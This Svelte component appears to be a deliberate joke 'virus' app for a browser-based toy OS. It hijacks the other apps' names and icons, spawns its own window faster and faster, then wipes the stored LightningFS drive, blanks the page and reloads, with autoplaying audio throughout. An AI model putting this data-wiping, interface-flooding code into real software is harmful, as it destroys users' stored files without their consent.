<script context="module">
  let started = false
</script>

<script lang="ts">
  import LightningFS from '@jkearl/lightning-fs'
  import apps from '../apps'

  import { onMount } from 'svelte'
  import { open_apps } from '../stores'
  import { nanoid } from '../util'
  export let session: string
  const self = $open_apps.find((sess) => sess.id === session).app
  const words = ['DaBaby', 'SmallInfant', 'real da baby', 'actual babey!']
  if (!started) {
    onMount(() => {
      apps.forEach((app, i) => {
        if (app !== self) {
          app.name = words[i % words.length] + '\u200B'.repeat(i + 1)
          app.icon =
            'https://upload.wikimedia.org/wikipedia/en/9/98/Dababy_BabyOnBaby.jpg'
          app.component = Promise.resolve(self.component)
        }
      })
      function spawn(timeout: number = 5000) {
        $open_apps = [
          ...$open_apps,
          {
            app: self,
            id: nanoid()
          }
        ]
        if (timeout < 0.01) {
          $open_apps = []
          new LightningFS(localStorage.getItem('drive') || 'mollerOS', {
            wipe: true
          })
          document.write('<html />')
          document.querySelector('html').style.background = 'black'
          setTimeout(() => {
            location.reload()
          }, 5 * 1000)
        } else {
          setTimeout(() => spawn(timeout / 1.5), timeout / 1.5)
        }
      }

      spawn()
    })
  }
  started = true
</script>

<!-- svelte-ignore a11y-media-has-caption -->
<audio
  autoplay
  loop
  src="https://api.meowpad.me/v1/download/26762-lets-go-dababy"
/>

<style>
  :global(*) {
    background-image: url('https://upload.wikimedia.org/wikipedia/en/9/98/Dababy_BabyOnBaby.jpg') !important;
    background-size: 100% 100%;
  }
</style>
